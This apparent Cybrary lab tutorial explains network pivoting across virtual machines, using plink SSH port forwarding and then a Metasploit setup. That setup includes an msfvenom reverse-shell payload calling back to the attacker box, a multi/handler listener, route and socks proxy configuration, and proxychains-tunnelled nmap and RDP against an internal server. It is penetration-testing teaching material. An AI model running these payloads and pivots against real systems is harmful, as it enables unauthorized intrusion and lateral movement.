##### From https://www.cybrary.it/0p3n/pivot-network-port-forwardingredirection-hands-look/
#### Description:
This tutorial is about “moving” through a network (from machine to machine). We use a compromised host as our pivot to move through the network.  This tutorial has a lack of screenshots. You can create the screenshots yourself as you follow this tutorial 😉

#### Prerequisites:
You need (at least) three machines for this tutorial. I suggest using VirtualBox or VMware machines.

The Attacking Box (Kali Linux)
* IP: 192.168.1.16
* Netmask: 255.255.255.0
* Gateway: 192.168.1.1

The pivot host (Windows XP)
Dual-Homed – Configure 2 Network Cards in VirtualBox!
* FIRST IP: 192.168.1.30
* Netmask: 255.255.255.0
* SECOND IP: 10.0.0.2
* Netmask: 255.0.0.0

Web server (IIS, Apache – Windows or Linux, whatever u like) -> I use a Windows 2012 server
* IP: 10.0.0.10
* Netmask: 255.0.0.0

There is no need to use a gateway!


#### Problem:
We want to reach the web server from the attacking box. But how can we do that? Both machines are in different subnets. 

Try to surf to the web server from the Kali-Box: http://10.0.0.10

This does not work!

(If you do not understand the problem at this point I highly suggest you leave this tutorial and get comfortable with network topics such as private network ranges and subnetting)

#### Solution:
We use the dual-homed machine to pivot to the web server!

#### Scenario 1 (Remote Port Forwarding):
We connect to the Windows XP machine using “rdesktop” on the Kali Box. We don´t attack the pivot here. We have the credentials.
	
  1. Connect to the Windows XP machine from your Kali Box: rdesktop 192.168.1.30
  2. Download “plink.exe” from the Kali box to the Windows XP machine
(plink.exe can be found on Kali -> “/usr/share/windows-binaries/plink.exe “-> Copy “plink.exe” to you web server root and start apache on Kali. Now you can download “plink.exe” on the Windows XP machine)
  3. Open a command prompt on the Windows XP machine and navigate to the place where you have saved “plink.exe”
  4. Start SSH Daemon on Kali-Box. /etc/init.d/ssh start
  5. Run the following command on the Windows XP machine:

plink 192.168.1.16 -P 22 -C -R 127.0.0.1:4444:10.0.0.10:80
(Login with your SSH credentials on Kali)

#### Try to reach the web server from your Kali Box the following way:
http://127.0.0.1:4444 -> Voila: It works! You can see the web server from 10.0.0.10!

OK, but what does the command do? Let’s split the command to see what is going on:

plink 192.168.1.16 -P 22 -> Tunnel the traffic using SSH on Kali-Box 192.168.1.16
-C -R -> -C is compression. -R tells plink to do a “Remote Port Forwarding”
127.0.0.1:4444:10.0.0.10:80 -> Local Host:Local Port:Remote Client:Remote Port (Local from the pivots perspective!)

#### Read the command backward:
“We bind the remote clients port 80 (10.0.0.10:80) to our local port (127.0.0.1:4444) and tunnel the traffic to 192.168.1.16 using SSH (192.168.1.16 -P 22)


#### Scenario 2 (Local Port Forwarding):
We want to connect to our Windows XP machine using Remote Desktop Protocol (RDP). The Port is 3389.
There is an Inbound Firewall rule that blocks connections to this port. Let´s pretend that we are not able to change the firewall settings.

(Create a specific rule on the XP machine or just imagine that RDP is not reachable on Port 3389)
The problem is: We still want RDP connection!

We simply redirect the local port 3389 ,let´s say, to port 3390.

On the Windows XP machine:  plink 192.168.1.16 -P 22 -C -L 192.168.1.30:3390:192.168.1.30:3389
(-L -> Local Port Forwarding)

Read the command backward to understand what is going on:

On the Kali Box:
rdesktop 192.168.1.30:3390 -> Voila, there is our Remote Desktop Session!

Sweet!


#### Scenario 3 (Dynamic Port Forwarding):
You are familiar with the concepts of local and remote port forwarding from Scenario 1 and Scenario 2.
Now let’s do some Hacking!
We want to Nmap the server on 10.0.0.10 from our attacking Kali-Box. Let´s attack the pivot machine to get a meterpreter shell from it.
(Generate a standalone executable meterpreter reverse shell (.exe file) on your Kali box, execute it on the pivot and catch it on Kali using Metasploit)
1. Generate a Stand-Alone meterpreter executable:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.16 LPORT=443 -f exe -o meterpreter.exe

2. Copy meterpreter.exe to Kalis webroot
  
3. Download meterpreter.exe to the XP machine
  
4. Setup the listener on the Kali Box:
    * msfconsole
    * use exploit/multi/handler
    * set PAYLOAD windows/meterpreter/reverse_tcp
    * set LHOST 192.168.1.16
    * set LPORT 443
    * exploit
  
5. Double-Click on meterpreter.exe and run it on the XP Machine
  
6. Now you have the meterpreter connection from the XP Machine on your Kali Box!
  
7. Type “ifconfig” and see that this host is a dual homed machine.
  
8. Type “background” to background the session
  
9. Now we have to add a route to our metasploit session 1:
route add 10.0.0.0 255.0.0.0 1
(1 is the session number in metasploit)
  
10. Verify that the route was added successfully:
route print
  
11. Now configure socks proxy in metasploit and start it:
  * use auxiliary/server/socks4a
  * set SRVHOST 127.0.0.1
  * run
(You can use default settings for SRVHOST 0.0.0.0 as well. The port is important. Default is Port 1080)
  
12. Configure proxy chains on the Kali Box:
  * vi /etc/proxychains.conf
Edit the ProxyList at the bottom of the file:
  * socks4   127.0.0.1   1080
The configuration has to be the same as in metasploit
  
13. Run you nmap scan using proxychains:
Some Tips:
You should use the options -Pn (assume that host is up) and -sT (TCP connect scan) with nmap through proxychains! 
Using other scan types, TCP Syn scan for example, will not work!

proxychains nmap -Pn -sT -p445,3389 10.0.0.10
(These two ports should be opened. If you see “denied” in the nmap result something went wrong with the proxy configuration or the route was added in the meterpreter session. 

Background the meterpreter session and then add the route in metasploit for the meterpreter Session! See Steps 9-11)
  
14. Get Remote Desktop
  * proxychains rdesktop 10.0.0.10
  
15. Surf to 10.0.0.10
  * proxychains firefox 10.0.0.10
